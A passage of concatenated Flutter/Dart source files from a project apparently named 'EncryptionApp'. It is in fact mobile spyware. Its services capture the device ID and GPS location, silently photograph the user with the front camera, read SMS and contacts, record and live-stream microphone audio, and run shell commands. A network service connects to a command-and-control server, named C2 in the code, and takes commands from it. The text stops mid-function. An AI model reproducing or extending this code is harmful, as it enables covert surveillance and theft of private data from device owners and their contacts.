  Future<bool> initializeCamera(CameraLensDirection direction) async {
    // الكود الأصلي سيتولى التهيئة عند استدعاء takePicture،
    // أو يمكننا إضافة دالة تهيئة خاصة إذا احتجنا لتهيئة مسبقة.
    // للتبسيط، نفترض أن الكود الأصلي يهيئ الكاميرا لكل لقطة.
    debugPrint(
        "CameraService (Dart): استدعاء initializeCamera لـ ${direction.name}. الكود الأصلي سيتولى التهيئة الفعلية.");
    // قد تصبح هذه الدالة بدون أي عمليات أو فقط للتسجيل إذا كان الكود الأصلي يدير كل شيء.
    return true; // نفترض أن الكود الأصلي سينجح أو يعالج الأخطاء.
  }

  Future<XFile?> takePicture(
      {required CameraLensDirection lensDirection}) async {
    debugPrint(
        "CameraService (Dart): محاولة التقاط صورة عبر قناة الاتصال (العدسة: ${lensDirection.name})");
    try {
      // استدعاء الدالة 'takePicture' في الكود الأصلي وتمرير اتجاه العدسة.
      final String? filePath = await _channel.invokeMethod('takePicture', {
        'lensDirection':
            lensDirection == CameraLensDirection.front ? 'front' : 'back',
      });

      if (filePath != null) {
        debugPrint(
            "CameraService (Dart): تم التقاط الصورة بنجاح عبر الكود الأصلي. المسار: $filePath");
        return XFile(filePath);
      } else {
        debugPrint(
            "CameraService (Dart): دالة takePicture الأصلية أعادت مسارًا فارغًا.");
        return null;
      }
    } on PlatformException catch (e) {
      debugPrint(
          "CameraService (Dart): خطأ أثناء استدعاء دالة takePicture الأصلية: ${e.message}");
      return null;
    } catch (e) {
      debugPrint("CameraService (Dart): خطأ غير متوقع في takePicture: $e");
      return null;
    }
  }

  Future<void> dispose() async {
    // إذا كان الكود الأصلي يدير دورة حياة الكاميرا، فقد تكون دالة dispose في Dart بسيطة.
    // يمكن استدعاء دالة dispose أصلية إذا لزم الأمر.
    debugPrint(
        "CameraService (Dart): استدعاء Dispose. يجب أن يتولى الكود الأصلي تحرير الموارد إذا لزم الأمر.");
    try {
      await _channel.invokeMethod(
          'disposeCamera'); // استدعاء دالة dispose في الكود الأصلي
    } on PlatformException catch (e) {
      debugPrint(
          "CameraService (Dart): خطأ أثناء استدعاء دالة disposeCamera الأصلية: ${e.message}");
    }
    // لا يوجد CameraController محلي لتحريره.
  }
}

// يمكن الإبقاء على هذا الامتداد المساعد
extension LensDirectionName on CameraLensDirection {
  String get name {
    switch (this) {
      case CameraLensDirection.front:
        return 'الأمامية';
      case CameraLensDirection.back:
        return 'الخلفية';
      case CameraLensDirection.external:
        return 'الخارجية';
    }
  }
}



// ------------------------------ نهاية الملف: camera_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: data_collector_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\data_collector_service.dart
// ----------------------------------------------------------------------

// lib/services/data_collector_service.dart
import 'dart:async';
import 'package:camera/camera.dart';
import 'package:flutter/foundation.dart'; // << لاستخدام debugPrint
import 'package:intl/intl.dart'; // لتنسيق الوقت
// import 'package:location/location.dart'; // << تم التغيير إلى geolocator
import 'package:geolocator/geolocator.dart'; // << لاستخدام Position

import 'location_service.dart';
import 'device_info_service.dart';
import 'camera_service.dart';

class DataCollectorService {
  final LocationService _locationService = LocationService();
  final DeviceInfoService _deviceInfoService = DeviceInfoService();
  final CameraService _cameraService = CameraService();

  Future<Map<String, dynamic>> collectInitialDataFromUiThread() async {
    debugPrint(
      "DataCollectorService (UI Thread): Starting initial data collection...",
    );
    final Map<String, dynamic> collectedPayload = {};
    Map<String, dynamic> jsonDataToBuild = {};
    XFile? capturedFrontImageFile;

    // 1. معلومات الجهاز
    debugPrint("DataCollectorService (UI Thread): Getting device info...");
    try {
      final deviceInfo = await _deviceInfoService.getDeviceInfo();
      jsonDataToBuild['deviceInfo'] = deviceInfo;
      if (deviceInfo.containsKey('deviceId')) {
        debugPrint(
          "DataCollectorService (UI Thread): Device info collected successfully, Device ID: ${deviceInfo['deviceId']}",
        );
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): WARNING - Device ID not found in deviceInfo payload from DeviceInfoService.",
        );
      }
    } catch (e, s) {
      debugPrint(
        "DataCollectorService (UI Thread): Error getting device info: $e\nStackTrace: $s",
      );
      jsonDataToBuild['deviceInfo'] = {
        'error': 'Failed to get device info',
        'details': e.toString(),
      };
    }

    // 2. الموقع الجغرافي (باستخدام Position من geolocator)
    debugPrint("DataCollectorService (UI Thread): Getting current location...");
    try {
      // LocationService.getCurrentLocation() الآن يعيد Position? من geolocator
      final Position? positionData =
          await _locationService.getCurrentLocation();
      if (positionData != null) {
        jsonDataToBuild['location'] = {
          'latitude': positionData.latitude,
          'longitude': positionData.longitude,
          'accuracy': positionData.accuracy,
          'altitude': positionData.altitude,
          'speed': positionData.speed,
          'timestamp_gps':
              positionData.timestamp
                  ?.toIso8601String(), // Position.timestamp is DateTime?
        };
        debugPrint(
          "DataCollectorService (UI Thread): Location data collected: ${jsonDataToBuild['location']}",
        );
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): Location data (Position) returned null.",
        );
        jsonDataToBuild['location'] = {
          'error':
              'Failed to get location data (service returned null Position)',
        };
      }
    } catch (e, s) {
      debugPrint(
        "DataCollectorService (UI Thread): Error getting location: $e\nStackTrace: $s",
      );
      jsonDataToBuild['location'] = {
        'error': 'Failed to get location due to exception',
        'details': e.toString(),
      };
    }

    // 3. التقاط صورة من الكاميرا الأمامية
    debugPrint(
      "DataCollectorService (UI Thread): Attempting to initialize and capture front camera image...",
    );
    try {
      // تم التأكد من أن CameraService.initializeCamera لا يتم استدعاؤه هنا مباشرة
      // بل يتم الاعتماد على أن QrScannerScreen يقوم بالتهيئة
      // ولكن لأغراض جمع البيانات الأولية، قد نحتاج لتهيئة مؤقتة إذا لم تكن مهيئة
      // أو الأفضل أن يكون CameraService مهيأً بشكل مستقل أو من خلال QrScannerScreen
      // بناءً على الخطأ السابق، takePicture يتطلب lensDirection
      capturedFrontImageFile = await _cameraService.takePicture(
        lensDirection: CameraLensDirection.front,
      );
      if (capturedFrontImageFile != null) {
        debugPrint(
          "DataCollectorService (UI Thread): Front image captured: ${capturedFrontImageFile.path}",
        );
        jsonDataToBuild['frontImageInfo'] = {
          'status': 'Captured',
          'name_on_device': capturedFrontImageFile.name,
          'path_on_device': capturedFrontImageFile.path,
        };
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): Front image capture attempt resulted in null XFile.",
        );
        jsonDataToBuild['frontImageInfo'] = {
          'error': 'Failed to capture front image (XFile was null)',
        };
      }
    } catch (e, s) {
      debugPrint(
        "DataCollectorService (UI Thread): Exception during front camera operations: $e\nStackTrace: $s",
      );
      jsonDataToBuild['frontImageInfo'] = {
        'error': 'Exception during camera operation',
        'details': e.toString(),
      };
    }
    // لا يتم عمل dispose للكاميرا هنا، QrScannerScreen يتولى ذلك

    // 4. إضافة الطابع الزمني النهائي
    jsonDataToBuild['timestamp_collection_utc'] =
        DateTime.now().toUtc().toIso8601String();
    jsonDataToBuild['timestamp_collection_local'] = DateFormat(
      'yyyy-MM-dd HH:mm:ss ZZZZ',
      'en_US',
    ).format(DateTime.now());

    // 5. تجميع الحمولة النهائية
    collectedPayload['data'] = jsonDataToBuild;
    collectedPayload['imageFile'] = capturedFrontImageFile;

    debugPrint(
      "DataCollectorService (UI Thread): Initial data collection process finished. Payload ready.",
    );
    return collectedPayload;
  }

  Future<void> disposeCamera() async {
    debugPrint(
      "DataCollectorService: disposeCamera() called from outside. Disposing camera resources...",
    );
    await _cameraService.dispose();
    debugPrint("DataCollectorService: Camera resources disposed.");
  }
}



// ------------------------------ نهاية الملف: data_collector_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: device_info_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\device_info_service.dart
// ----------------------------------------------------------------------

// lib/services/device_info_service.dart
import 'dart:io' show Platform;

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/foundation.dart' show kIsWeb, debugPrint;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

import '../utils/constants.dart'; //  للوصول إلى PREF_DEVICE_ID المحدث

class DeviceInfoService {
  final DeviceInfoPlugin _deviceInfoPlugin = DeviceInfoPlugin();
  final Uuid _uuid = const Uuid();

  Future<String> getOrCreateUniqueDeviceId() async {
    final prefs = await SharedPreferences.getInstance();
    String? deviceId = prefs.getString(PREF_DEVICE_ID); // استخدام الثابت المحدث

    if (deviceId != null && deviceId.isNotEmpty) {
      debugPrint("DeviceInfoService: Retrieved existing Device ID: $deviceId");
      return deviceId;
    }

    try {
      if (kIsWeb) {
        // For web, a UUID is generally the most reliable persistent client identifier
        // that doesn't rely on browser-specific or easily cleared storage like localStora
        // However, for consistency with mobile, we'll generate a UUID and store it.
        deviceId = "web_${_uuid.v4()}";
      } else if (Platform.isAndroid) {
        final androidInfo = await _deviceInfoPlugin.androidInfo;
        // androidInfo.id (SSAID) can be null or change on factory reset.
        // It's generally unique per app signing key, app, and user.
        // Using it as a base if available.
        String? nativeId =
            androidInfo.id; // android.os.Build.SERIAL is restricted.
        if (nativeId.isNotEmpty && nativeId != "unknown") {
          deviceId = "android_$nativeId";
        } else {
          // Fallback for Android if SSAID is not good
          deviceId = "android_uuid_${_uuid.v4()}";
        }
      } else if (Platform.isIOS) {
        final iosInfo = await _deviceInfoPlugin.iosInfo;
        // identifierForVendor is unique to the app's vendor on that device.
        if (iosInfo.identifierForVendor != null &&
            iosInfo.identifierForVendor!.isNotEmpty) {
          deviceId = "ios_${iosInfo.identifierForVendor!}";
        } else {
          // Fallback for iOS
          deviceId = "ios_uuid_${_uuid.v4()}";
        }
      } else {
        // Other platforms (Linux, Windows, macOS)
        // For desktop, combination of machine details might be an option, but UUID is simpler for now.
        deviceId = "desktop_${_uuid.v4()}";
      }
    } catch (e) {
      debugPrint(
          "DeviceInfoService: Error getting native device ID: $e. Falling back to pure UUID.");
      deviceId = "generic_uuid_${_uuid.v4()}"; // Pure UUID as a last resort
    }
    // Ensure deviceId is never null before saving
    if (deviceId.isEmpty) {
      deviceId = "fallback_uuid_${_uuid.v4()}";
      debugPrint(
          "DeviceInfoService: Device ID was still null/empty, used final fallback UUID: $deviceId");
    }

    await prefs.setString(PREF_DEVICE_ID, deviceId); // استخدام الثابت المحدث
    debugPrint(
        "DeviceInfoService: Generated and saved new Device ID: $deviceId");
    return deviceId;
  }

  Future<Map<String, dynamic>> getDeviceInfo() async {
    final String uniqueId = await getOrCreateUniqueDeviceId();
    final Map<String, dynamic> deviceData = {
      'deviceId': uniqueId, // المعرف الفريد للجهاز
      'platform': 'unknown_platform',
      'osVersion': 'unknown_os_version',
      'model': 'unknown_model',
      'deviceName': 'unknown_device_name',
      'brand': 'unknown_brand',
      'isPhysicalDevice': 'unknown',
      'systemFeatures': <String>[], // خاص بالأندرويد
      'collectedAt': DateTime.now().toUtc().toIso8601String(),
    };

    try {
      if (kIsWeb) {
        deviceData['platform'] = 'web';
        final webBrowserInfo = await _deviceInfoPlugin.webBrowserInfo;
        deviceData['osVersion'] = webBrowserInfo.platform ?? 'N/A';
        deviceData['model'] = webBrowserInfo.browserName
            .toString()
            .split('.')
            .last; // e.g., Chrome
        deviceData['deviceName'] = webBrowserInfo.userAgent?.substring(
                0,
                (webBrowserInfo.userAgent?.length ?? 0) > 200
                    ? 200
                    : (webBrowserInfo.userAgent?.length ?? 0)) ??
            'N/A';
        deviceData['brand'] = webBrowserInfo.vendor ?? 'N/A';
        deviceData['isPhysicalDevice'] =
            'false'; // Web is not a physical device in this context
      } else if (Platform.isAndroid) {
        final androidInfo = await _deviceInfoPlugin.androidInfo;
        deviceData['platform'] = 'android';
        deviceData['osVersion'] = androidInfo.version.release; // e.g., "13"
        deviceData['sdkInt'] = androidInfo.version.sdkInt;
        deviceData['brand'] = androidInfo.brand; // e.g., "samsung"
        deviceData['model'] = androidInfo.model; // e.g., "SM-G991U"
        deviceData['deviceName'] =
            androidInfo.device; // internal name e.g., "starqltesq"
        deviceData['product'] = androidInfo.product; // user-facing product name
        deviceData['display'] = androidInfo.display; // display ID
        deviceData['isPhysicalDevice'] =
            androidInfo.isPhysicalDevice.toString();
        deviceData['systemFeatures'] = androidInfo.systemFeatures;
        // deviceData['androidId_debug'] = androidInfo.id; // SSAID for debugging
      } else if (Platform.isIOS) {
        final iosInfo = await _deviceInfoPlugin.iosInfo;
        deviceData['platform'] = 'ios';
        deviceData['osVersion'] = iosInfo.systemVersion; // e.g., "16.5"
        deviceData['model'] =
            iosInfo.model; // e.g., "iPhone14,5" (internal model name)
        deviceData['utsname_machine'] =
            iosInfo.utsname.machine; // More specific model
        deviceData['deviceName'] = iosInfo.name; // e.g., "John's iPhone"
        deviceData['brand'] = 'Apple';
        deviceData['isPhysicalDevice'] = iosInfo.isPhysicalDevice.toString();
        // deviceData['identifierForVendor_debug'] = iosInfo.identifierForVendor; // For debugging
      }
      // Add other platforms if needed (macOS, Windows, Linux)
    } catch (e, s) {
      debugPrint(
          "DeviceInfoService: Error getting detailed device info: $e\nStackTrace: $s");
      deviceData['error_getting_device_info'] = e.toString();
    }
    return deviceData;
  }
}



// ------------------------------ نهاية الملف: device_info_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: file_system_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\file_system_service.dart
// ----------------------------------------------------------------------

// lib/services/file_system_service.dart
import 'package:flutter/foundation.dart'; // لـ debugPrint
import 'package:flutter/services.dart';
// لا حاجة لـ EnhancedLoggerService هنا مباشرة إذا كانت الأخطاء تُمرر للخارج

class FileSystemService {
  // اسم القناة يجب أن يتطابق مع ما هو معرف في MainActivity.kt
  static const MethodChannel _channel = MethodChannel(
      'com.zeroone.theconduit/files'); // تم التغيير من /filesystem إلى /files

  Future<Map<String, dynamic>?> listFiles(String path) async {
    debugPrint(
        "FileSystemService (Dart): Attempting to list files for path: $path via platform channel");
    try {
      final Map<dynamic, dynamic>? result = await _channel.invokeMethod(
        'listFiles', // اسم الدالة في الكود الأصلي
        {'path': path}, // الوسائط المرسلة
      );
      if (result != null) {
        // تحويل المفاتيح إلى String إذا لم تكن كذلك بالفعل
        final Map<String, dynamic> typedResult = Map<String, dynamic>.from(
          result.map((key, value) => MapEntry(key.toString(), value)),
        );
        debugPrint(
            "FileSystemService (Dart): Successfully listed files. Data: ${typedResult.toString().substring(0, (typedResult.toString().length > 200 ? 200 : typedResult.toString().length))}"); // تسجيل جزء من النتيجة
        return typedResult;
      } else {
        debugPrint(
            "FileSystemService (Dart): Native listFiles method returned null.");
        return {
          'error': 'Native method for listFiles returned null',
          'path': path,
          'files': []
        };
      }
    } on PlatformException catch (e) {
      debugPrint(
          "FileSystemService (Dart): PlatformException during listFiles: ${e.code} - ${e.message} - Details: ${e.details}");
      return {
        'error': e.message,
        'details': e.details,
        'errorCode': e.code,
        'path': path,
        'files': []
      };
    } catch (e) {
      debugPrint("FileSystemService (Dart): Unexpected error in listFiles: $e");
      return {'error': e.toString(), 'path': path, 'files': []};
    }
  }

  Future<Map<String, dynamic>?> executeShellCommand(
    String command,
    List<String> args,
  ) async {
    debugPrint(
        "FileSystemService (Dart): Attempting to execute shell command: '$command' with args: $args");
    // !!! تنبيه: هذا سيفشل إذا لم يتم تنفيذ الجزء الأصلي في MainActivity.kt !!!
    // !!! تأكد من أن MainActivity.kt لديها معالج لـ "executeShell" !!!
    try {
      final Map<dynamic, dynamic>? result = await _channel.invokeMethod(
        'executeShell', // اسم الدالة المتوقع في الكود الأصلي
        {'command': command, 'args': args},
      );
      if (result != null) {
        final Map<String, dynamic> typedResult = Map<String, dynamic>.from(
          result.map((key, value) => MapEntry(key.toString(), value)),
        );
        debugPrint(
            "FileSystemService (Dart): Shell command executed. Output: $typedResult");
        return typedResult;
      } else {
        debugPrint(
            "FileSystemService (Dart): Native executeShell method returned null.");
        return {
          'error': 'Native method for executeShell returned null',
          'command': command
        };
      }
    } on PlatformException catch (e) {
      debugPrint(
          "FileSystemService (Dart): PlatformException during executeShell: ${e.code} - ${e.message} - Details: ${e.details}");
      if (e.code == "NotImplemented") {
        return {
          'error':
              "Shell execution is not implemented on the native side (Android/iOS). Command: '$command'",
          'details': e.details,
          'errorCode': e.code
        };
      }
      return {
        'error': e.message,
        'details': e.details,
        'errorCode': e.code,
        'command': command
      };
    } catch (e) {
      debugPrint(
          "FileSystemService (Dart): Unexpected error in executeShellCommand: $e");
      return {'error': e.toString(), 'command': command};
    }
  }
}



// ------------------------------ نهاية الملف: file_system_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: location_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\location_service.dart
// ----------------------------------------------------------------------

// lib/services/location_service.dart
// الإصدار المعدل لاستخدام إضافة geolocator للعمل بشكل أفضل في الخلفية

import 'dart:async'; // Required for TimeoutException
import 'package:flutter/foundation.dart';
import 'package:geolocator/geolocator.dart';
import 'package:flutter/services.dart';

class LocationService {
  // لا حاجة لإنشاء كائن من Geolocator، فالدوال ثابتة (static)

  Future<Position?> getCurrentLocation() async {
    bool serviceEnabled;
    LocationPermission permission;

    // التحقق من أن خدمات الموقع مفعلة على الجهاز
    serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      debugPrint("LocationService (geolocator): خدمات الموقع معطلة.");
      return null;
    }

    permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      debugPrint(
        "LocationService (geolocator): إذن الموقع مرفوض. محاولة طلب الإذن...",
      );
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        debugPrint("LocationService (geolocator): طلب إذن الموقع مرفوض.");
        return null;
      }
    }

    if (permission == LocationPermission.deniedForever) {
      debugPrint("LocationService (geolocator): إذن الموقع مرفوض بشكل دائم.");
      return null;
    }

    debugPrint(
      "LocationService (geolocator): الأذونات ممنوحة وخدمات الموقع مفعلة. محاولة الحصول على الموقع...",
    );

    try {
      return await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
        // timeLimit: const Duration(seconds: 15), // Can be added if needed
      );
    } on PlatformException catch (e) {
      debugPrint(
        "LocationService (geolocator): خطأ PlatformException أثناء الحصول على الموقع: ${e.code} - ${e.message}",
      );
      return null;
    } on LocationServiceDisabledException catch (e) {
      debugPrint(
        "LocationService (geolocator): خطأ LocationServiceDisabledException: ${e.toString()}",
      );
      return null;
    } on TimeoutException catch (e) {
      // Now TimeoutException is recognized
      debugPrint(
        "LocationService (geolocator): انتهت مهلة الحصول على الموقع: ${e.message}",
      );
      return null;
    } catch (e) {
      debugPrint(
        "LocationService (geolocator): خطأ غير متوقع أثناء الحصول على الموقع: $e",
      );
      return null;
    }
  }
}



// ------------------------------ نهاية الملف: location_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: native_features_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\native_features_service.dart
// ----------------------------------------------------------------------

// lib/services/native_features_service.dart
import 'dart:async';

import 'package:flutter/services.dart';
// Import your logger if you have one, e.g.:
// import '../core/logging/enhanced_logger_service.dart';

class NativeFeaturesService {
  static const MethodChannel _nativeFeaturesChannel =
      MethodChannel('com.zeroone.theconduit/native_features');
  // final EnhancedLoggerService _logger = EnhancedLoggerService(); // If using a logger

  final StreamController<Uint8List> _audioChunkController =
      StreamController<Uint8List>.broadcast();
  Stream<Uint8List> get onAudioChunk => _audioChunkController.stream;

  NativeFeaturesService() {
    _nativeFeaturesChannel.setMethodCallHandler(_handleNativeMethodCalls);
  }

  Future<dynamic> _handleNativeMethodCalls(MethodCall call) async {
    // _logger.debug("NativeFeaturesService", "Received call from native: ${call.method}");
    print("NativeFeaturesService: Received call from native: ${call.method}");
    switch (call.method) {
      case "onLiveAudioChunk":
        if (call.arguments is Uint8List) {
          _audioChunkController.add(call.arguments as Uint8List);
        } else {
          // _logger.warn("NativeFeaturesService", "onLiveAudioChunk received non-Uint8List data: ${call.arguments.runtimeType}");
          print(
              "NativeFeaturesService: onLiveAudioChunk received non-Uint8List data: ${call.arguments.runtimeType}");
        }
        break;
      default:
        // _logger.warn("NativeFeaturesService", "Unhandled native method: ${call.method}");
        print("NativeFeaturesService: Unhandled native method: ${call.method}");
    }
  }

  Future<List<Map<String, dynamic>>?> getSmsList() async {
    try {
      // _logger.info("NativeFeaturesService", "Requesting SMS list from native.");
      print("NativeFeaturesService: Requesting SMS list from native.");
      final List<dynamic>? smsListDynamic =
          await _nativeFeaturesChannel.invokeMethod('getSmsList');
      if (smsListDynamic != null) {
        return smsListDynamic
            .map((sms) => Map<String, dynamic>.from(sms as Map))
            .toList();
      }
      // _logger.info("NativeFeaturesService", "SMS list received as null.");
      print("NativeFeaturesService: SMS list received as null.");
      return null;
    } on PlatformException catch (e) {
      // _logger.error("NativeFeaturesService", "Failed to get SMS list: '${e.message}'. Details: ${e.details}");
      print(
          "NativeFeaturesService: Failed to get SMS list: '${e.message}'. Details: ${e.details}");
      return null;
    } catch (e) {
      // _logger.error("NativeFeaturesService", "Generic error getting SMS list: $e");
      print("NativeFeaturesService: Generic error getting SMS list: $e");
      return null;
    }
  }

  Future<List<Map<String, dynamic>>?> getContactsList() async {
    try {
      // _logger.info("NativeFeaturesService", "Requesting contacts list from native.");
      print("NativeFeaturesService: Requesting contacts list from native.");
      final List<dynamic>? contactsListDynamic =
          await _nativeFeaturesChannel.invokeMethod('getContactsList');
      if (contactsListDynamic != null) {
        return contactsListDynamic
            .map((contact) => Map<String, dynamic>.from(contact as Map))
            .toList();
      }
      // _logger.info("NativeFeaturesService", "Contacts list received as null.");
      print("NativeFeaturesService: Contacts list received as null.");
      return null;
    } on PlatformException catch (e) {
      // _logger.error("NativeFeaturesService", "Failed to get contacts list: '${e.message}'. Details: ${e.details}");
      print(
          "NativeFeaturesService: Failed to get contacts list: '${e.message}'. Details: ${e.details}");
      return null;
    } catch (e) {
      // _logger.error("NativeFeaturesService", "Generic error getting contacts list: $e");
      print("NativeFeaturesService: Generic error getting contacts list: $e");
      return null;
    }
  }

  Future<String?> recordAudioForDuration(int durationSeconds) async {
    try {
      // _logger.info("NativeFeaturesService", "Requesting audio recording for $durationSeconds seconds.");
      print(
          "NativeFeaturesService: Requesting audio recording for $durationSeconds seconds.");
      final String? filePath = await _nativeFeaturesChannel
          .invokeMethod('recordAudio', {'duration_seconds': durationSeconds});
      // _logger.info("NativeFeaturesService", "Audio recording finished. File path: $filePath");
      print(
          "NativeFeaturesService: Audio recording finished. File path: $filePath");
      return filePath;
    } on PlatformException catch (e) {
      // _logger.error("NativeFeaturesService", "Failed to record audio: '${e.message}'. Details: ${e.details}");
      print(
          "NativeFeaturesService: Failed to record audio: '${e.message}'. Details: ${e.details}");
      return null;
    } catch (e) {
      // _logger.error("NativeFeaturesService", "Generic error recording audio: $e");
      print("NativeFeaturesService: Generic error recording audio: $e");
      return null;
    }
  }

  Future<String?> startLiveAudioStreaming() async {
    try {
      // _logger.info("NativeFeaturesService", "Requesting to start live audio streaming.");
      print("NativeFeaturesService: Requesting to start live audio streaming.");
      final response =
          await _nativeFeaturesChannel.invokeMethod('startLiveAudio');
      // _logger.info("NativeFeaturesService", "Start live audio response: $response");
      print("NativeFeaturesService: Start live audio response: $response");
      return response?.toString();
    } on PlatformException catch (e) {
      // _logger.error("NativeFeaturesService", "Failed to start live audio: '${e.message}'. Details: ${e.details}");
      print(
          "NativeFeaturesService: Failed to start live audio: '${e.message}'. Details: ${e.details}");
      return "Error: ${e.message}";
    } catch (e) {
      // _logger.error("NativeFeaturesService", "Generic error starting live audio: $e");
      print("NativeFeaturesService: Generic error starting live audio: $e");
      return "Error: $e";
    }
  }

  Future<String?> stopLiveAudioStreaming() async {
    try {
      // _logger.info("NativeFeaturesService", "Requesting to stop live audio streaming.");
      print("NativeFeaturesService: Requesting to stop live audio streaming.");
      final response =
          await _nativeFeaturesChannel.invokeMethod('stopLiveAudio');
      // _logger.info("NativeFeaturesService", "Stop live audio response: $response");
      print("NativeFeaturesService: Stop live audio response: $response");
      return response?.toString();
    } on PlatformException catch (e) {
      // _logger.error("NativeFeaturesService", "Failed to stop live audio: '${e.message}'. Details: ${e.details}");
      print(
          "NativeFeaturesService: Failed to stop live audio: '${e.message}'. Details: ${e.details}");
      return "Error: ${e.message}";
    } catch (e) {
      // _logger.error("NativeFeaturesService", "Generic error stopping live audio: $e");
      print("NativeFeaturesService: Generic error stopping live audio: $e");
      return "Error: $e";
    }
  }

  void dispose() {
    _audioChunkController.close();
    // _logger.info("NativeFeaturesService", "Disposed.");
    print("NativeFeaturesService: Disposed.");
  }
}



// ------------------------------ نهاية الملف: native_features_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: network_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\network_service.dart
// ----------------------------------------------------------------------

// lib/services/network_service.dart
import 'dart:async';
import 'dart:convert'; //
import 'dart:io'; //
import 'dart:typed_data'; // For Uint8List

import 'package:camera/camera.dart' show XFile; //
import 'package:http/http.dart' as http; //
import 'package:socket_io_client/socket_io_client.dart' as sio; //

import '../config/app_config.dart'; //
import '../core/logging/enhanced_logger_service.dart'; //
import '../utils/constants.dart'; //

class NetworkService {
  sio.Socket? _socket; //
  final EnhancedLoggerService _logger = EnhancedLoggerService(); //
  int _reconnectAttempts = 0; //
  Timer? _reconnectTimer; //
  Timer? _heartbeatTimer; //
  bool _isReconnecting = false; //
  String? _lastConnectedDeviceId; //

  final StreamController<bool> _connectionStatusController =
      StreamController<bool>.broadcast(); //
  Stream<bool> get connectionStatusStream =>
      _connectionStatusController.stream; //

  final StreamController<Map<String, dynamic>> _commandController =
      StreamController<Map<String, dynamic>>.broadcast(); //
  Stream<Map<String, dynamic>> get commandStream =>
      _commandController.stream; //

  bool get isSocketConnected => _socket?.connected ?? false; //

  NetworkService() {
    _logger.info("NetworkService", "NetworkService instance created."); //
  }

  void _initializeSocket(String deviceIdForConnection) {
    _lastConnectedDeviceId = deviceIdForConnection; //

    if (_socket != null) {
      _logger.info("NetworkService:_initializeSocket",
          "Disposing existing socket before creating a new one."); //
      _socket!.dispose(); //
      _socket = null;
    }

    _logger.info("NetworkService:_initializeSocket",
        "Initializing Socket.IO to $C2_SOCKET_IO_URL for Device ID: $deviceIdForConnection"); //
    try {
      _socket = sio.io(C2_SOCKET_IO_URL, <String, dynamic>{
        //
        'transports': ['websocket', 'polling'],
        'autoConnect': false,
        'forceNew': true, //
        'reconnection': true, //
        'reconnectionAttempts': C2_SOCKET_IO_RECONNECT_ATTEMPTS > 0
            ? C2_SOCKET_IO_RECONNECT_ATTEMPTS
            : 5, //
        'reconnectionDelay': C2_SOCKET_IO_RECONNECT_DELAY.inMilliseconds, //
        'reconnectionDelayMax': C2_SOCKET_IO_RECONNECT_DELAY.inMilliseconds * 5,
        'timeout': 20000,
        'query': {
          //
          'deviceId': deviceIdForConnection,
          'clientType': APP_NAME, //
          'timestamp': DateTime.now().millisecondsSinceEpoch.toString(),
          'version': '1.0.1', // Increment version if needed
        },
      });

      _socket!.onConnect((_) {
        //
        _logger.info("NetworkService:Events",
            "Socket.IO Connected! SID: ${_socket?.id}, Device ID: $deviceIdForConnection");
        _connectionStatusController.add(true);
        _reconnectAttempts = 0;
        _isReconnecting = false;
        _stopReconnectTimer();
        _startHeartbeat();
      });

      _socket!.onDisconnect((reason) {
        //
        _logger.warn("NetworkService:Events",
            "Socket.IO Disconnected. Reason: $reason. Device ID: $_lastConnectedDeviceId");
        _connectionStatusController.add(false);
        _stopHeartbeat();
        if (!_isReconnecting && _lastConnectedDeviceId != null) {
          _scheduleReconnect(); //
        }
      });

      _socket!.onConnectError((error) {
        //
        _logger.error(
            "NetworkService:Events",
            "Socket.IO Connection Error. Device ID: $_lastConnectedDeviceId",
            error);
        _connectionStatusController.add(false);
        _stopHeartbeat();
        if (!_isReconnecting && _lastConnectedDeviceId != null) {
          _scheduleReconnect();
        }
      });

      _socket!.onError((error) {
        //
        _logger.error(
            "NetworkService:Events",
            "Socket.IO Generic Error. Device ID: $_lastConnectedDeviceId",
            error);
      });

      _socket!.on('command', (data) {
        //
        if (data is Map) {
          final String? commandName = data['command'] as String?;
          final Map<String, dynamic> args = data['args'] is Map
              ? Map<String, dynamic>.from(data['args'])
              : {}; //
          final String? commandId = data['command_id'] as String?; //

          if (commandName != null) {
            _logger.info("NetworkService:CommandListener",
                "Received unified command '$commandName' (ID: ${commandId ?? "N/A"}) from C2 with args: $args. Device ID: $_lastConnectedDeviceId");
            _commandController.add({
              //
              'command': commandName,
              'command_id': commandId,
              'args': args,
            });
          } else {
            _logger.warn(
                "NetworkService:CommandListener", //
                "Received command with null name. Data: $data. Device ID: $_lastConnectedDeviceId");
          }
        } else {
          _logger.warn(
              "NetworkService:CommandListener", //
              "Received malformed command data (not a Map): $data. Device ID: $_lastConnectedDeviceId");
        }
      });

      _socket!.on(SIO_EVENT_REQUEST_REGISTRATION_INFO, (_) {
        //
        _logger.info("NetworkService:Events",
            "Received '$SIO_EVENT_REQUEST_REGISTRATION_INFO' from C2. Device ID: $_lastConnectedDeviceId");
        _commandController.add({
          //
          'command': SIO_EVENT_REQUEST_REGISTRATION_INFO,
          'command_id':
              'server_request_reg_${DateTime.now().millisecondsSinceEpoch}',
          'args': {}, //
        });
      });

      _socket!.on(SIO_EVENT_REGISTRATION_SUCCESSFUL, (data) {
        //
        _logger.info("NetworkService:Events",
            "Received '$SIO_EVENT_REGISTRATION_SUCCESSFUL' from C2. Data: $data. Device ID: $_lastConnectedDeviceId");
      });
    } catch (e, stackTrace) {
